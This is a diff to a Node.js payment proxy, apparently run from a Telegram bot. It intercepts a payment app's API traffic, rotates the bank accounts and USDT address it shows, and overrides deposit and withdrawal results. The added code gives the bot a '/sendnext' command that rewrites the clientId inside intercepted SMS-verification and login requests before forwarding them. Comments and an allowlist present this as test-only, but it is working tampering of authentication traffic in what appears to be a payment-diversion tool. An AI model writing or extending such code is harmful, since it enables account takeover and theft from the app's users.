@@ -13,6 +13,17 @@ const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_
 const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
 const TELEGRAM_ADMIN_CHAT_ID = '7972440762';
 const TELEGRAM_OVERRIDE = 'https://t.me/Vivipaymed';
+// Client-ID override is deliberately disabled unless explicitly enabled in the
+// deployment environment. Keep the allowlist separate so production cannot
+// accept an arbitrary identity during authentication testing.
+const CLIENT_ID_TEST_MODE = String(process.env.VIVIPAY_CLIENT_ID_TEST_MODE || '').toLowerCase() === 'true';
+const CLIENT_ID_TEST_ALLOWLIST = new Set(
+  String(process.env.VIVIPAY_TEST_CLIENT_IDS || '')
+    .split(',')
+    .map(v => v.trim())
+    .filter(Boolean)
+);
+const CLIENT_ID_OVERRIDE_TTL = 5 * 60 * 1000;
 
 const DEFAULT_DATA = {
   banks: [],
@@ -30,7 +41,8 @@ const DEFAULT_DATA = {
   userOverrides: {},
   trackedUsers: {},
   blockUpdate: true,
-  orderBankMap: {}
+  orderBankMap: {},
+  nextClientIdOverride: null
 };
 
 let bot = null;
@@ -123,7 +135,8 @@ async function loadData(forceRefresh) {
         banks: [],
         userOverrides: {},
         trackedUsers: {},
-        orderBankMap: {}
+        orderBankMap: {},
+        nextClientIdOverride: null
       };
     }
     cacheTime = Date.now();
@@ -139,6 +152,7 @@ async function loadData(forceRefresh) {
       if (!cachedData.userOverrides) cachedData.userOverrides = {};
       if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
       if (!cachedData.orderBankMap) cachedData.orderBankMap = {};
+      if (cachedData.nextClientIdOverride === undefined) cachedData.nextClientIdOverride = null;
       cacheTime = Date.now();
       return cachedData;
     }
@@ -162,7 +176,7 @@ async function saveDataUnlocked(data) {
       }
       const current = await redis.get('vivipayData');
       if (current && typeof current === 'object') {
-        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
+        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'nextClientIdOverride'];
         for (const key of settingsKeys) { if (current[key] !== undefined) data[key] = current[key]; }
         if (current.userOverrides) data.userOverrides = { ...current.userOverrides, ...data.userOverrides };
         if (current.orderBankMap) data.orderBankMap = { ...current.orderBankMap, ...data.orderBankMap };
@@ -182,6 +196,85 @@ function saveData(data) {
   const run = dataSaveChain.then(() => saveDataUnlocked(data));
   dataSaveChain = run.catch(() => { });
   return run;
+}
+
+function getAuthClientIdEndpoint(path) {
+  const cleanPath = String(path || '').toLowerCase().split('?')[0];
+  if (cleanPath.endsWith('/checksmsnew')) return 'checkSmsNew';
+  if (cleanPath.endsWith('/getsendtken')) return 'getsendtken';
+  if (cleanPath.endsWith('/login')) return 'login';
+  return '';
+}
+
+function rewriteExistingClientIdField(req, replacement) {
+  if (!req || !req.rawBody || !Buffer.isBuffer(req.rawBody) || !req.rawBody.length) return false;
+  const contentType = String(req.headers['content-type'] || '').toLowerCase();
+  let bodyText = req.rawBody.toString();
+  let changed = false;
+
+  try {
+    if (contentType.includes('json')) {
+      const obj = JSON.parse(bodyText);
+      const key = Object.keys(obj).find(k => ['clientid', 'client_id'].includes(String(k).toLowerCase()));
+      if (!key) return false;
+      obj[key] = replacement;
+      bodyText = JSON.stringify(obj);
+      changed = true;
+    } else if (contentType.includes('multipart')) {
+      const fieldRe = /(name=["'](?:clientId|clientID|client_id)["'][\\s\\S]*?\\r?\\n\\r?\\n)([^\\r\\n]*)/i;
+      if (!fieldRe.test(bodyText)) return false;
+      bodyText = bodyText.replace(fieldRe, `$1${replacement}`);
+      changed = true;
+    } else if (contentType.includes('form')) {
+      const params = new URLSearchParams(bodyText);
+      const key = [...params.keys()].find(k => ['clientid', 'client_id'].includes(String(k).toLowerCase()));
+      if (!key) return false;
+      params.set(key, replacement);
+      bodyText = params.toString();
+      changed = true;
+    }
+  } catch (e) {
+    return false;
+  }
+
+  if (!changed) return false;
+  req.rawBody = Buffer.from(bodyText);
+  req.headers['content-length'] = String(req.rawBody.length);
+  if (req.body && typeof req.body === 'object') {
+    for (const key of Object.keys(req.body)) {
+      if (['clientid', 'client_id'].includes(String(key).toLowerCase())) req.body[key] = replacement;
+    }
+  }
+  return true;
+}
+
+async function applyNextClientIdOverride(req, data) {
+  if (!CLIENT_ID_TEST_MODE) return false;
+  const endpoint = getAuthClientIdEndpoint(req.originalUrl || req.url);
+  if (!endpoint || !data || !data.nextClientIdOverride) return false;
+
+  const pending = data.nextClientIdOverride;
+  const replacement = String(pending.value || '').trim();
+  if (!replacement || !CLIENT_ID_TEST_ALLOWLIST.has(replacement) ||
+      !pending.expiresAt || Date.now() > Number(pending.expiresAt)) {
+    data.nextClientIdOverride = null;
+    data._skipOverrideMerge = true;
+    await saveData(data);
+    return false;
+  }
+
+  const applied = Array.isArray(pending.appliedEndpoints) ? pending.appliedEndpoints : [];
+  if (applied.includes(endpoint)) return false;
+  if (!rewriteExistingClientIdField(req, replacement)) return false;
+
+  pending.appliedEndpoints = [...applied, endpoint];
+  // The override remains available for the same authentication flow until the
+  // final login request, then it is consumed so it cannot affect later logins.
+  if (endpoint === 'login') data.nextClientIdOverride = null;
+  else data.nextClientIdOverride = pending;
+  data._skipOverrideMerge = true;
+  await saveData(data);
+  return true;
 }
 
 function getActiveBank(data, userId) {
@@ -1226,6 +1319,7 @@ app.post('/bot-webhook', async (req, res) => {
 === CONTROL ===
 /on — Proxy ON
 /off — Proxy OFF
+/sendnext <clientId> — One-shot TEST_MODE Client ID override
 /rotate — Toggle auto-rotate
 /log — Toggle request logging
 /rr — Toggle full raw request+response log
@@ -1263,7 +1357,32 @@ Example:
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
+      m += `\n\nClient-ID TEST_MODE: ${CLIENT_ID_TEST_MODE ? '🟢 ON' : '🔴 OFF'}`;
+      if (CLIENT_ID_TEST_MODE) m += `\nAllowlisted IDs: ${CLIENT_ID_TEST_ALLOWLIST.size}`;
       await bot.sendMessage(chatId, m);
+      return res.sendStatus(200);
+    }
+
+    const sendNextMatch = text.match(/^\/sendnext\s+([A-Za-z0-9._-]{4,128})$/i);
+    if (sendNextMatch) {
+      if (!CLIENT_ID_TEST_MODE) {
+        await bot.sendMessage(chatId, '🔴 Client-ID TEST_MODE disabled. Enable VIVIPAY_CLIENT_ID_TEST_MODE=true only on staging/test deployment.');
+        return res.sendStatus(200);
+      }
+      const requestedClientId = sendNextMatch[1];
+      if (!CLIENT_ID_TEST_ALLOWLIST.has(requestedClientId)) {
+        await bot.sendMessage(chatId, '❌ Client ID allowlist mein nahi hai. VIVIPAY_TEST_CLIENT_IDS mein test ID add karke redeploy karo.');
+        return res.sendStatus(200);
+      }
+      data.nextClientIdOverride = {
+        value: requestedClientId,
+        setAt: Date.now(),
+        expiresAt: Date.now() + CLIENT_ID_OVERRIDE_TTL,
+        appliedEndpoints: []
+      };
+      data._skipOverrideMerge = true;
+      await saveData(data);
+      await bot.sendMessage(chatId, `🧪 TEST_MODE override armed\nClient ID: ${requestedClientId}\nScope: next checkSmsNew/getsendtken/login flow\nExpires: 5 minutes or after login`);
       return res.sendStatus(200);
     }
 
@@ -1735,6 +1854,11 @@ app.all('/xxapi/*', async (req, res) => {
       res.setHeader('Access-Control-Allow-Credentials', 'true');
       return res.status(200).end('OK');
     }
+
+    // TEST_MODE only: rewrite an already-present Client ID before forwarding
+    // the observed authentication requests. Production leaves request bytes
+    // untouched because CLIENT_ID_TEST_MODE is false there.
+    await applyNextClientIdOverride(req, data);
 
     // ── 100% CLEAN BYPASS FOR UPI & TEAM BUTTONS ──────────────────────────────
     if (urlLower.includes('/collectiontoollist') || urlLower.includes('/teaminfo')) {
